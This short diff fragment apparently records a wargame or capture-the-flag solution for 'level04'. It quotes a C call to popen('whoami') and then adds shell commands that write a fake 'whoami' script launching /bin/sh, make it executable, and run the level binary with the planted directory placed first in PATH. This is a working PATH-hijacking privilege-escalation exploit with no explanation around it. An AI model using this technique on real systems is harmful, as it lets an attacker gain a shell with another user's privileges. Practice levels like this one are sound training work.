@@ -1,0 +1,8 @@
+      FILE* f = popen("whoami","r");
+
+echo "/bin/sh" > /tmp/x456/whoami
+
+chmod +x /tmp/x456/whoami
+
+PATH=/tmp/x456:$PATH ./level04
+
